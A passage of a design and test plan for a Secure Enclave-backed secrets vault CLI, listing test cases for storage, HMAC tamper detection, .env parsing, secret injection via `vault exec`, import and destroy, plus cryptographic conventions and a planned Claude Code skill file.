| Version mismatch rejected | vault.json with `"version": 99` returns error |
| Secret name validation: valid names | `MY_KEY`, `_private`, `a`, `A1_B2_C3` all accepted |
| Secret name validation: boundary | 128-char name accepted, 129-char name rejected |
| Secret name validation: invalid | Empty string, `123KEY`, `KEY-NAME`, `KEY.NAME`, `KEY NAME` all rejected |
| Model serde roundtrip | Serialize and deserialize every model struct, verify equality |

### Phase 3: CLI Commands (init, set, get, update, delete, list)

Command files: `VaultInitCommand.swift`, `VaultSetCommand.swift`, `VaultGetCommand.swift`, `VaultUpdateCommand.swift`, `VaultDeleteCommand.swift`, `VaultListCommand.swift`. Registration in `main.swift` as `Vault` subcommand group.

#### Phase 3 Tests: Open Vault Integration (Automated, No Human)

These tests run against the real Secure Enclave using the `open` vault. They require Apple Silicon but no human interaction, making them suitable for CI and Claude Code automation.

**Setup/teardown:** Each test creates a fresh vault using a temporary `--config` directory, runs the test, then destroys it.

| Test | Verifies |
|------|----------|
| Init creates all three vaults | vault.json has biometric, passcode, open entries |
| Full lifecycle: set, get, update, delete | Happy path for all CRUD commands on open vault |
| Set and get roundtrip (10 secrets) | Bulk set 10 secrets, get each, verify all match |
| Set and get with special characters in value | Values containing quotes, newlines, null bytes, emoji, max-length strings |
| Update changes value | Set "KEY" to "old", update to "new", get returns "new" |
| Update preserves createdAt | Set, wait 1s, update, verify createdAt unchanged and updatedAt > createdAt |
| Delete removes secret | Set, delete with --confirm, get returns "not found" |
| Delete then set (reuse name) | Set "KEY", delete, set "KEY" with new value, get returns new value |
| HMAC integrity after set | Set a secret, manually corrupt ciphertext in vault.json, attempt get, verify integrity error |
| HMAC integrity after update | Update a secret, manually corrupt the updated entry, verify integrity error |
| HMAC integrity after delete | Delete a secret, manually corrupt vault.json to re-add it, verify integrity error |
| HMAC integrity on empty vault | Init, verify get on nonexistent secret returns "not found" (not integrity error) |
| List shows all vaults | Init, list, verify all three vaults in output |
| List shows secrets per vault | Set 2 in open, 0 in others, list shows correct counts |
| List on fresh vault | Init, list, verify empty secrets arrays |
| Destroy removes everything | Init, set secrets, destroy --confirm, verify vault.json deleted |

#### Phase 3 Tests: Multi-Vault (Automated via VaultStore + Software P-256)

These tests verify cross-vault behavior using VaultStore directly with software P-256 keys (bypassing the CLI and SE) to simulate multiple vault policies without biometric prompts.

| Test | Verifies |
|------|----------|
| Secrets in different vaults, find resolves both | Set A in vault-1, B in vault-2, find each returns correct vault |
| Global name uniqueness enforced across vaults | Set "KEY" in vault-1, attempt set "KEY" in vault-2, verify error |
| Update targets correct vault | Set A in vault-1, B in vault-2, update B, verify vault-1 HMAC unchanged |
| Delete targets correct vault | Delete from vault-2 does not affect vault-1 HMAC |
| HMAC isolation | Tamper with vault-1's secrets, verify vault-2's HMAC still valid |

#### Phase 3 Tests: Tamper Resistance (Automated, Open Vault)

These tests directly modify `vault.json` between operations to verify the HMAC catches all forms of tampering.

| Test | Verifies |
|------|----------|
| Add secret directly to JSON | Insert a new secret entry without `vault set`, verify next get fails integrity |
| Remove secret directly from JSON | Delete a secret entry, verify next get on remaining secret fails integrity |
| Modify ciphertext | Change one byte of ciphertext, verify get fails integrity |
| Modify ephemeral public key | Replace a secret's ephemeral public key, verify get fails integrity |
| Modify nonce | Change one byte of nonce, verify get fails integrity |
| Modify tag | Change one byte of tag, verify get fails integrity |
| Modify secret metadata | Change createdAt timestamp, verify get fails integrity |
| Replace entire HMAC | Overwrite HMAC with random bytes, verify all operations fail integrity |
| Remove HMAC field | Delete integrityHmac field, verify all operations fail |
| Swap secrets between vaults | Move a secret from vault A to vault B in the JSON, verify both vaults fail integrity |
| Replay old vault state | Save vault.json after set A, set B, restore old vault.json, verify integrity fails |
| Modify integrity ephemeral public key | Replace with different key, verify HMAC derivation fails |

#### Phase 3 Tests: Error Paths (Unit + Integration)

| Test | Verifies |
|------|----------|
| Init when SE unavailable | Returns correct error (testable on Intel Macs or via mock) |
| Set before init | Returns "vault not initialized" |
| Set with empty value (interactive) | Returns "empty value" error |
| Set with empty value (--stdin, empty pipe) | Returns "empty value" error |
| Get nonexistent secret | Returns "secret not found" |
| Update nonexistent secret | Returns "secret not found" |
| Delete nonexistent secret | Returns "secret not found" |
| Delete without --confirm | Returns "--confirm required" |
| Destroy without --confirm | Returns "--confirm required" |
| Destroy before init | Returns "vault not initialized" |
| Secret name too long (129 chars) | Rejected |
| Secret name with invalid chars | `KEY-NAME`, `KEY.NAME`, `123KEY` all rejected |
| vault.json missing when expected | Returns appropriate error for each command |
| vault.json with wrong permissions | Verify the CLI warns (or errors) if permissions are too open |

### Phase 4: vault exec

`VaultExecCommand.swift`: argument parsing, multi-vault secret resolution, grouped decryption, child process spawning with augmented environment, exit code forwarding. `LAContext` integration for the custom prompt string. `.env` file parser (key name extraction).

#### Phase 4 Tests: `.env` File Parsing (Unit)

| Test | Verifies |
|------|----------|
| Basic KEY=VALUE | Extracts key name correctly |
| Empty value KEY= | Extracts key name |
| Quoted value KEY="value" | Extracts key name (value ignored) |
| Single-quoted KEY='value' | Extracts key name |
| export prefix | `export KEY=value` extracts "KEY" |
| Comment lines skipped | Lines starting with `#` produce no output |
| Blank lines skipped | Empty lines and whitespace-only lines produce no output |
| Inline comments | `KEY=value # comment` extracts "KEY" |
| No equals sign | Line without `=` is skipped with warning |
| Duplicate keys | Same key twice produces one entry (deduplicated) |
| Mixed valid and invalid | File with valid, invalid, and comment lines produces correct key list |
| Windows line endings | `KEY=value\r\n` handles correctly |
| Leading/trailing whitespace | `  KEY = value  ` extracts "KEY" (trimmed) |
| Empty file | Returns empty list, no error |
| UTF-8 BOM | File with BOM is handled (BOM stripped) |

#### Phase 4 Tests: Exec Integration (Automated, Open Vault)

| Test | Verifies |
|------|----------|
| Exec injects environment | `vault exec --allow KEY -- env` and grep for KEY in output |
| Exec with --env file | Create .env, `vault exec --env .env -- env`, verify all keys present |
| Exec with --allow and --env merged | Use both flags, verify union of secrets injected |
| Exec with * wildcard | Set 3 secrets, `vault exec --allow '*' -- env`, verify all 3 present |
| Exec exit code forwarding | `vault exec --allow KEY -- bash -c 'exit 42'`, verify exit code is 42 |
| Exec missing secret fails | `vault exec --allow NONEXISTENT -- true`, verify exit code 126 |
| Exec env var precedence | Export `KEY=old` in shell, vault exec injects `KEY=new`, verify child sees "new" |
| Exec with no --allow or --env | Returns usage error |
| Exec with empty --allow list | Returns error |
| Exec integrity failure | Corrupt vault.json, attempt exec, verify exit code 126 |
| Exec with nonexistent .env file | Returns error |
| Exec stdout/stderr passthrough | Child writes to both, verify parent receives both |
| Exec with failing command | `vault exec --allow KEY -- false`, verify exit code 1 |
| Exec command not found | `vault exec --allow KEY -- nonexistent-binary`, verify exit code 127 |

### Phase 5: vault import, vault destroy

`VaultImportCommand.swift`: `.env` parser, bulk encryption, skip-existing logic. `VaultDestroyCommand.swift`: all-vault teardown.

#### Phase 5 Tests: Import (Automated, Open Vault)

| Test | Verifies |
|------|----------|
| Import from .env file | Create .env with 5 entries, import to open vault, verify all 5 gettable |
| Import skips existing | Set "KEY_A" in open vault, import .env containing "KEY_A" and "KEY_B", verify KEY_A skipped and KEY_B imported |
| Import skips cross-vault existing | Set "KEY_A" in biometric (via VaultStore), import to open, verify KEY_A skipped |
| Import dry-run | Import with --dry-run, verify no secrets stored |
| Import to specific vault | `import .env --vault open`, verify secrets in open vault |
| Import nonexistent file | Returns "file not found" |
| Import malformed .env | Returns parse warnings, skips bad lines, imports valid ones |
| Import empty file | Succeeds with 0 imported, 0 skipped |

#### Phase 5 Tests: Destroy (Automated, Open Vault)

| Test | Verifies |
|------|----------|
| Destroy removes vault.json | Init, set secrets, destroy --confirm, verify vault.json deleted |
| Destroy without --confirm | Returns "--confirm required", vault.json unchanged |
| Destroy before init | Returns "vault not initialized" |
| Destroy reports correct counts | Init, set 3 in open + 2 in biometric (via VaultStore), destroy, verify totalSecretsDeleted = 5 |

### Phase 6: Agent skill file

`skills/vault/SKILL.md`: Claude Code skill file documenting the vault commands, common workflows, and the `vault exec` pattern. This file enables any Claude Code agent to use the vault without project-specific instructions.

The skill file should cover:

- How to run commands that need secrets (`vault exec --env .env.example -- <command>`).
- That the agent should never attempt to read, copy, or exfiltrate secret values.
- That `vault get` should be avoided in agent workflows; prefer `vault exec`.
- Common error codes and what they mean (especially exit code 128 for authentication cancellation -- the user declined and the agent should not retry).
- That `vault list` is safe to call and does not require authentication.

### Manual Tests (Requires Human with Touch ID)

These tests CANNOT be automated and should be run after all phases are complete. They require a human tester with Apple Silicon and Touch ID hardware.

| Test | Human Action | Verifies |
|------|-------------|----------|
| Init completes | Approve passcode + Touch ID | All three vaults created, vault.json correct |
| Init cancel on passcode | Cancel passcode dialog | No vault.json written (all-or-nothing) |
| Init cancel on biometric | Cancel Touch ID | No vault.json written (all-or-nothing) |
| Set secret in biometric vault | Approve Touch ID | Secret stored, HMAC updated |
| Get secret from biometric vault | Approve Touch ID | Correct value returned |
| Update secret in biometric vault | Approve Touch ID | Value changes, HMAC updated |
| Delete secret from biometric vault | Approve Touch ID | Secret removed, HMAC updated |
| Cancel Touch ID on get | Press Cancel | Exit code 4, no value output |
| Cancel Touch ID on set | Press Cancel | Exit code 7, no secret stored |
| Cancel Touch ID on update | Press Cancel | Exit code 4, original value preserved |
| Cancel Touch ID on delete | Press Cancel | Exit code 4, secret preserved |
| Cancel Touch ID on exec | Press Cancel | Exit code 128, child process not spawned |
| Exec across biometric + open | Approve Touch ID once | Biometric and open secrets both injected, only one prompt |
| Exec across all three vaults | Approve passcode + Touch ID | All secrets injected, two prompts total |
| Touch ID prompt shows correct reason | Read prompt text | `localizedReason` includes command and secret names |
| Set secret in passcode vault | Enter device passcode | Secret stored |
| Get from passcode vault | Enter device passcode | Correct value returned |
| Cancel passcode dialog | Press Cancel | Exit code 4 |
| Destroy | Approve passcode + Touch ID | vault.json deleted |
| Destroy cancel partway | Cancel Touch ID after passcode | Warning printed, vault.json still deleted |

---

## Conventions

These supplement the existing conventions in `docs/conventions.md`:

- **Vault key type**: `SecureEnclave.P256.KeyAgreement.PrivateKey`, NOT `Signing.PrivateKey`. These are distinct CryptoKit types with different capabilities.
- **HKDF info strings**: Encryption uses `"keypo-vault-v1" || secret_name`. Integrity uses `"keypo-vault-integrity-v1"`. UTF-8 concatenation, no separator. The version prefix enables future format migration.
- **Canonical JSON serialization**: For HMAC computation, the `secrets` object is serialized with keys sorted alphabetically and no unnecessary whitespace. This ensures deterministic HMAC regardless of insertion order.
- **Nonce generation**: `AES.GCM.Nonce()` (CryptoKit's default random 12-byte nonce). Fresh nonce per encryption operation.
- **Zeroization**: Ephemeral private keys, derived symmetric keys, HMAC keys, and plaintext buffers must be zeroized after use. CryptoKit handles this for its own types. For `Data` buffers holding plaintext, use `resetBytes(in:)` before deallocation.
- **Atomic file writes**: Same pattern as `KeyMetadataStore`: write to a temp file in the same directory, then `rename(2)` to the target path.
- **Secret name convention**: Uppercase with underscores (`PIMLICO_API_KEY`), matching environment variable conventions. The validator accepts lowercase but uppercase is the documented convention.
- **Global name uniqueness**: Secret names must be unique across ALL vaults. The CLI checks all vaults before allowing `vault set`.
- **Vault key IDs**: `com.keypo.vault.biometric`, `com.keypo.vault.passcode`, `com.keypo.vault.open`.
- **No `--value` flag**: Never accept secret values as command-line arguments. Interactive prompt or `--stdin` only.

---

## Future Considerations

These are explicitly out of scope for the initial implementation but worth noting:

- **Secret rotation tracking**: Similar to signing key rotation, track previous encrypted values to support audit trails.
- **TTL/expiration**: Secrets that auto-expire after a configurable duration.
- **Allowed command whitelist**: A configuration that restricts which commands `vault exec` can run, providing defense-in-depth against malicious agent command construction.
- **Remote vault sync**: Encrypted backup/restore of vault contents (the encryption is already portable since it uses standard ECIES).
- **Integration with keypo-wallet CLI**: The Rust crate could shell out to `keypo-signer vault get` for secrets instead of reading `.env` files, creating a consistent secrets-via-vault pattern across the project.
- **Move secret between vaults**: A `vault move <n> --to <policy>` command that re-encrypts a secret under a different vault's key in a single atomic operation.
